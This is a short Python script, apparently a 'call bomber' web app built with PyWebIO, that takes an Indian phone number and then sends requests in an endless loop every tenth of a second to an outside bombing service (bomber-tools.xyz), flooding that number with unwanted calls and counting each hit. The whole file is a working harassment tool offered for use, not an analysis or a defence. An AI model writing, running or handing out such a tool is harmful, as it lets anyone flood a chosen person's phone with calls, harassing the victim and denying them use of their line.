import pywebio.output as output
import pywebio.input as input
import pywebio
import requests,time

count = {}

def MyApp():
    skc = input.input_group('• Call Bomber By: SANCHIT 💸', [input.input(" • Enter Your Number (without +91) ", name="SK")])
    SK = str(skc["SK"])

    if SK not in count:
        count[SK] = {"successful": 0, "failed": 0}

    while True:
        req = requests.get(f"https://bomber-tools.xyz/?mobile={SK}&accesskey=BomberSmm&submit=Submit").text

        if 'started' in req:
            count[SK]["successful"] += 1
            output.put_html(f'<h3>✅ Bombing On - Count: {count[SK]["successful"]}</h3><i>    BY: SANCHIT</i>')
            time.sleep(0.1)
        else:
            count[SK]["failed"] += 1
            output.put_html(f'<h3>❌ Bombing Off - Count: {count[SK]["failed"]}</h3><i>    BY: SANCHIT</i>')
            time.sleep(0.1)

if __name__ == '__main__':
    pywebio.start_server(MyApp, port=8086, debug=True)
